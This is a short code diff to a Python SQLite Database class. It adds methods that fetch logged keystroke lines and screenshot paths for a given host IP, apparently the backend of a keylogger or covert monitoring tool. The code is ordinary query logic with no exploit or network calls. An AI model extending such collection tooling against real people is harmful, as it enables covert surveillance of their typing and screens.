@@ -144,9 +144,9 @@ class Database(object):
         self.conn.close()
 
     def create(self, script=None):
-        '''
+        """
         Create the database with the given script
-        '''
+        """
         self.location = "db_servers.sqlite"
         # set the location of the script
         if script is None:
@@ -246,11 +246,11 @@ class Database(object):
         # Write the changes to the DB
         self.conn.commit()
 
-    def get_file(self, ip):
+    def get_keystrokes(self, ip):
         """
         Get screenshots from a specific host
         :param ip: host to retrieve from
-        :return: path to screenshot
+        :return: tables of keystroke lines
         """
         ip = ip.strip()
 
@@ -262,7 +262,25 @@ class Database(object):
         if not results:
             return {}
         else:
-            return results[0]
+            return results
+
+    def get_files(self, ip):
+        """
+        Get screenshots from a specific host
+        :param ip: host to retrieve from
+        :return: tables of paths to screenshots
+        """
+        ip = ip.strip()
+
+        # construct and execute query
+        qry = "SELECT * FROM {} WHERE {} = ?;".format("files", "ip")
+        results = self.handle_query(qry, ip)
+
+        # return results if query succeeds
+        if not results:
+            return {}
+        else:
+            return results
 
     def GENERIC(self, table, col, val):
         """
